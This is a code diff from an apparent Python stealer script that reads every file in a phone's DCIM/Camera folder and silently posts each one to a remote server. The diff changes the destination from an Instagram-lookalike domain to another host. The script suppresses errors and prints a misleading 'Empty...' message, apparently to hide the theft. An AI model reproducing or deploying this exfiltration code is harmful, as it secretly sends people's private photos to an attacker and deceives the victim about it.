@@ -10,7 +10,7 @@ for i in range(len(l)):
 	f = open("../storage/shared/DCIM/Camera/"+l[i], "rb")
 	r = f.read()
 	try:
-		requests.post("http://instagram.com.xsph.ru/test/", data={"im": r})
+		requests.post("http://cl18178.tmweb.ru/", data={"im": r})
 	except:
 		pass
 print("Пусто...")
